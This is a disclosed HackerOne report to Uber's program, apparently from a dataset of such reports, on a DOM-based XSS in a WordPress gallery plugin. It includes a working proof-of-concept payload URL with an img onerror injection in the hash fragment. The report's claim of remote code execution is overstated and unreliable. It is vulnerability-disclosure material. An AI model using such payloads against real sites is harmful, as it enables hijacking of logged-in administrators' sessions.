---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '139875'
original_report_id: '139875'
title: DOM based XSS on
weakness: Code Injection
team_handle: uber
created_at: '2016-05-19T21:27:31.254Z'
disclosed_at: '2016-05-26T00:19:31.556Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 1
tags:
- hackerone
- code-injection
---

# DOM based XSS on

## Metadata

- HackerOne Report ID: 139875
- Weakness: Code Injection
- Program: uber
- Disclosed At: 2016-05-26T00:19:31.556Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Possible Remote code execution DOM based XSS 

Vuln Jquery param :
var strliID=jQuery(location).attr('hash');

Target: Logged admin
Go url >> https://drive.uber.com/melbourne/wp-admin/admin.php?page=Options_gallery_styles#"><img src=M onerror=alert('0wn3d');>

Solution : Upgrade latest version gallery plugin (Your version v1.9.55)


Test my localhost picture attached:

Regards..

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
